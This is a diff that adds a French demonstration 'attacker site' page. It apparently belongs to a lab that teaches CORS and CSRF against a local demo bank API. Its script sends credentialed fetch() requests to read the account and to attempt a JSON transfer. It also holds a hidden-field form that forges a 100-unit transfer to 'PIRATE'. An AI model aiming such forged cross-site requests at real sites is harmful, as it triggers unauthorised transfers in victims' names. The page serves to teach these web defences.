@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+	<meta charset="UTF-8">
+	<title>Site pirate démo</title>
+</head>
+
+<body>
+	<h1>Site pirate démo</h1>
+	<p>Ce site tourne sur <strong>http://localhost:9090</strong>.</p>
+	<p>L'API banque tourne sur <strong>http://localhost:8080</strong>.</p>
+	<hr>
+	<h2>1. Lire le compte avec fetch()</h2>
+	<p>Illustre CORS : le navigateur autorise ou bloque la lecture de la réponse.</p>
+	<button onclick="lireCompte()">Lire le compte banque</button>
+	<pre id="resultatCompte"></pre>
+	<hr>
+	<h2>2. Tenter un virement JSON avec fetch()</h2>
+	<p>Déclenche souvent une requête preflight OPTIONS : POST + application/json.</p>
+	<button onclick="virementJson()">Tenter virement JSON</button>
+	<pre id="resultatJson"></pre>
+	<hr>
+	<h2>3. Attaque CSRF par formulaire HTML</h2>
+	<p>Le formulaire n'a pas besoin de lire la réponse. Il veut juste déclencher l'action.</p>
+	<form action="http://localhost:8080/virement" method="post">
+		<input type="hidden" name="beneficiaire" value="PIRATE">
+		<input type="hidden" name="montant" value="100">
+		<button type="submit">Envoyer un faux virement par formulaire</button>
+	</form>
+	<script>
+		async function lireCompte() {
+			const zone = document.getElementById("resultatCompte");
+			zone.textContent = "Appel en cours...";
+			try {
+				const response = await fetch("http://localhost:8080/api/compte", {method: "GET", credentials: "include"});
+				const texte = await response.text();
+				zone.textContent = "HTTP " + response.status + "\n" + texte;
+			} catch (e) {zone.textContent = "Erreur navigateur : " + e;}
+		}
+		async function virementJson() {
+			const zone = document.getElementById("resultatJson");
+			zone.textContent = "Appel en cours...";
+			try {
+				const response = await fetch("http://localhost:8080/api/virement-json", {
+					method: "POST",
+					credentials: "include",
+					headers: {"Content-Type": "application/json"},
+					body: JSON.stringify({beneficiaire: "PIRATE_JSON", montant: 100})
+				});
+				const texte = await response.text();
+				zone.textContent = "HTTP " + response.status + "\n" + texte;
+			} catch (e) {zone.textContent = "Erreur navigateur : " + e;}
+		}
+	</script>
+</body>
+
+</html>
